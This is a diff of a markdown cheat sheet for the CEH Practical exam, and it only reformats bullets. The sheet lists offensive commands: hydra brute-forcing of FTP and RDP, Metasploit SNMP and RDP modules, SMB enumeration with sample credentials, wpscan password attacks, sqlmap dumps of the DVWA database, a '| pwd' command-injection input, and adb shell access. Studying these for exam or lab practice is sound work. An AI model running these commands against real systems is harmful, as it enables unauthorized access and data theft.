@@ -15,90 +15,90 @@ Tools
 12.	Android Debugging Bridge (adb)
 # PRACTICAL TIME
 1.	**Network Scanning & Vulnerability Assessment**
-•	Find Live hosts (nmap /netdiscover)
-	Sudo nmap [IP address] – for exam (CEH Practical)
-o	Sudo nmap –sC –sV –v –A –p– –O –T4 [IP Address range] – more aggressive deep scanning
-o	Sudo nmap –sV –script vuln [IP Address] – finding vulnerabilities in a host (-oX save file)
-o	Sudo nmap –sP 192.168.1.*:- when scanning a large network
+	Find Live hosts (nmap /netdiscover)
+	Sudo nmap [IP address] – for exam (CEH Practical)
+	Sudo nmap –sC –sV –v –A –p– –O –T4 [IP Address range] – more aggressive deep scanning
+	Sudo nmap –sV –script vuln [IP Address] – finding vulnerabilities in a host (-oX save file)
+	Sudo nmap –sP 192.168.1.*:- when scanning a large network
 
-•	Find open ports & services running on those ports (nmap)
-	Sudo nmap –sC –sV –v –p– –T4 [IP Address range]
+	Find open ports & services running on those ports (nmap)
+	Sudo nmap –sC –sV –v –p– –T4 [IP Address range]
 2.	**Enumeration**
-•	ftp port 21 – used to transfer files between computers (file sharing)
-o	check IP to see which is running ftp
-	nmap –sC –p 21 [IP address]
-o	ftp [IP] :- you need to bruteforce the password login credentials using hydra tool
-	hydra –L username.txt –P password.txt [IP address] ftp (  the lists of password & usernames are given in the exam)
-	login ftp [IP address]
-o	enter password and username from the one that you brute forced
-o	ftp>ls
-o	ftp> get secret.txt (used to download the file into your local machine)
-o	root@attacker:~#ls
-o	root@attacker:~#cat secret.txt (to view the file contents)
+	ftp port 21 – used to transfer files between computers (file sharing)
+	check IP to see which is running ftp
+	nmap –sC –p 21 [IP address]
+	ftp [IP] :- you need to bruteforce the password login credentials using hydra tool
+	hydra –L username.txt –P password.txt [IP address] ftp (  the lists of password & usernames are given in the exam)
+	login ftp [IP address]
+	enter password and username from the one that you brute forced
+	ftp>ls
+	ftp> get secret.txt (used to download the file into your local machine)
+	root@attacker:~#ls
+root@attacker:~#cat secret.txt (to view the file contents)
 
-•	SNMP port 161– used to monitor and manage network devices e.g. routers, switches, servers etc.
-o	Nmap –sP [IP /24]
-o	Nmap –sU [IP Address] (scan for UDP ports on the target machine) 
-o	snmp-check [ip address] NB take note of the UDP port to listen to)
-o	check NSE scripts online on nmap.org
-o	nmap –sU –p 161(UDP port) –script=snmp-processes [IP Address] ( finding running process using nmap
-o	msfconsole (start Metasploit to find valid strings)
-o	msf5>search snmp
-o	msf5>use auxiliary/scanner/snmp/snmp_login
-o	msf5 auxiliary(scanner/snmp/snmp_login)> show options
-o	msf5 auxiliary(scanner/snmp/snmp_login)>set RHOSTS [IP Address]
-o	msf5 auxiliary(scanner/snmp/snmp_login)>exploit
-•	SNMP check interfaces
-o	nmap –sU –p 161(UDP port) –script=snmp-interfaces [IP Address] ( finding running process using nmap
-o	snmp-check [IP address]
-•	SMB Enumeration (SMB request services from server programs, it’s a protocol that allows apps on a computer read/write files)
-o	Nmap [target IP] (smb running on port 445)
-o	Nmap –p 445 --script smb-enum-shares [IP address] (enumerating files) shares files with details permissions
-o	Connecting GUI method (smb://[IP] on web)
-o	Nmap –p 445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating users)
-o	Nmap –p 445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating groups)
-o	Nmap –sC –sV –A –T4 –p445 [IP Address] (enumerating security levels)
-o	Nmap –p 445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating services)
-o	
-•	Making an RDP session and Enumerate RDP service
-o	Nmap [Ip address] port 3333 or 3389 is for RDP
-o	Msfconsole
-o	msf5> search rdp
-o	msf5>use auxiliary/scanner/rdp/rdp_scanner
-o	msf5 auxiliary(scanner/rdp/rdp_scanner)> set RHOSTS [target IP]
-o	msf5 auxiliary(scanner/rdp/rdp_scanner)>set RPORT 3333
-o	msf5 auxiliary(scanner/rdp/rdp_scanner)>exploit (detected rdp on ….. confirmed rdp is running)
-o	hydra –L {path} –P{path} rdp://[IP address] –s 3333 (brute force passwords & save them)
-o	root@attacker:~# xfreerdp /u:administrator /p:etcect /v:[ip]:3333(create an rdp session) 
-•	Enumerate NetBIOS port 137(UDP: TCP)/138(UDP)/139(TCP) facilitates and allows computer to connect over the local network, access files & resources such as printers & files
-o	Check ip first by ip a
-o	Nmap –sP [IP address]
-o	Nmap –sV --script nbstat.nse [IP address]
+	SNMP port 161– used to monitor and manage network devices e.g. routers, switches, servers etc.
+	Nmap –sP [IP /24]
+	Nmap –sU [IP Address] (scan for UDP ports on the target machine) 
+	snmp-check [ip address] NB take note of the UDP port to listen to)
+	check NSE scripts online on nmap.org
+	nmap –sU –p 161(UDP port) –script=snmp-processes [IP Address] ( finding running process using nmap
+	msfconsole (start Metasploit to find valid strings)
+	msf5>search snmp
+	msf5>use auxiliary/scanner/snmp/snmp_login
+	msf5 auxiliary(scanner/snmp/snmp_login)> show options
+	msf5 auxiliary(scanner/snmp/snmp_login)>set RHOSTS [IP Address]
+	msf5 auxiliary(scanner/snmp/snmp_login)>exploit
+	SNMP check interfaces
+	nmap –sU –p 161(UDP port) –script=snmp-interfaces [IP Address] ( finding running process using nmap
+	snmp-check [IP address]
+SMB Enumeration (SMB request services from server programs, it’s a protocol that allows apps on a computer read/write files)
+	Nmap [target IP] (smb running on port 445)
+	Nmap –p 445 --script smb-enum-shares [IP address] (enumerating files) shares files with details permissions
+	Connecting GUI method (smb://[IP] on web)
+	Nmap –p 445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating users)
+	Nmap –p 445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating groups)
+	Nmap –sC –sV –A –T4 –p445 [IP Address] (enumerating security levels)
+	Nmap –p 445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating services)
+	
+	Making an RDP session and Enumerate RDP service
+	Nmap [Ip address] port 3333 or 3389 is for RDP
+	Msfconsole
+	msf5> search rdp
+	msf5>use auxiliary/scanner/rdp/rdp_scanner
+	msf5 auxiliary(scanner/rdp/rdp_scanner)> set RHOSTS [target IP]
+	msf5 auxiliary(scanner/rdp/rdp_scanner)>set RPORT 3333
+	msf5 auxiliary(scanner/rdp/rdp_scanner)>exploit (detected rdp on ….. confirmed rdp is running)
+	hydra –L {path} –P{path} rdp://[IP address] –s 3333 (brute force passwords & save them)
+	root@attacker:~# xfreerdp /u:administrator /p:etcect /v:[ip]:3333(create an rdp session) 
+	Enumerate NetBIOS port 137(UDP: TCP)/138(UDP)/139(TCP) facilitates and allows computer to connect over the local network, access files & resources such as printers & files
+	Check ip first by ip a
+	Nmap –sP [IP address]
+	Nmap –sV --script nbstat.nse [IP address]
 
 3.	**Hacking Web Application & Android** 
-•	Wpscan
-o	Wpscan in Kali Linux Wpscan –h will show you all the commands you can use
-o	Wpscan –url [copy url http://192.168.0.1] --enumerate u  (u for users) 
-o	Wpscan –url (or just –u for url) [copy url http://192.168.0.1] --enumerate u vp (vp for vulnerable plugins & u for users) 
-o	Sudo Wpscan --password-attack xmlrpc –t 20 –U (usernames) –P (password list)  --url http://[IP] --random-user-agent (if necessary)- bruteforce for passwords
-•	Sqlmap for sql injections–Using DVWA website
-o	Go to command execution
-o	Enter an IP address and submit :- [IP] | pwd to see the directory that I am
-o	UserID enter 1
-o	Open burp Suite
-o	Go to terminal in parrot : sqlmap –r req.txt –dbs the file is in desktop
-o	Sqlmap –r req.txt –D dvwa ( name of the data base )
-o	Sqlmap –r req.txt –D dvwa --tables --columns   ( Details )
-o	Sqlmap –r req.txt –D dvwa --dump (contents of the tables)
-•	Burp Suite
-o	Check on http requests and proxy (use this to save  cookies as req.txt)
-•	Android Pentest (ADB) – a tool that bridge the communication between your device and computer ( use windows)
-o	‘adb devices’ command will show you all the devices connected
-o	adb connect [IP address]:5555 ( just give any port) 
-o	adb shell ( you are in the device )
-o	hit ls to see where you are in the device
-o	cd sdcard/
-o	cat secrete.txt
+	Wpscan
+	Wpscan in Kali Linux Wpscan –h will show you all the commands you can use
+	Wpscan –url [copy url http://192.168.0.1] --enumerate u  (u for users) 
+	Wpscan –url (or just –u for url) [copy url http://192.168.0.1] --enumerate u vp (vp for vulnerable plugins & u for users) 
+	Sudo Wpscan --password-attack xmlrpc –t 20 –U (usernames) –P (password list)  --url http://[IP] --random-user-agent (if necessary)- bruteforce for passwords
+	Sqlmap for sql injections–Using DVWA website
+	Go to command execution
+	Enter an IP address and submit :- [IP] | pwd to see the directory that I am
+	UserID enter 1
+	Open burp Suite
+	Go to terminal in parrot : sqlmap –r req.txt –dbs the file is in desktop
+	Sqlmap –r req.txt –D dvwa ( name of the data base )
+	Sqlmap –r req.txt –D dvwa --tables --columns   ( Details )
+	Sqlmap –r req.txt –D dvwa --dump (contents of the tables)
+	Burp Suite
+	Check on http requests and proxy (use this to save  cookies as req.txt)
+	Android Pentest (ADB) – a tool that bridge the communication between your device and computer ( use windows)
+	‘adb devices’ command will show you all the devices connected
+	adb connect [IP address]:5555 ( just give any port) 
+	adb shell ( you are in the device )
+	hit ls to see where you are in the device
+	cd sdcard/
+	cat secrete.txt
 4.	**Traffic Sniffing**
 •	Wireshark
 Pcap analysis – Filtering packets
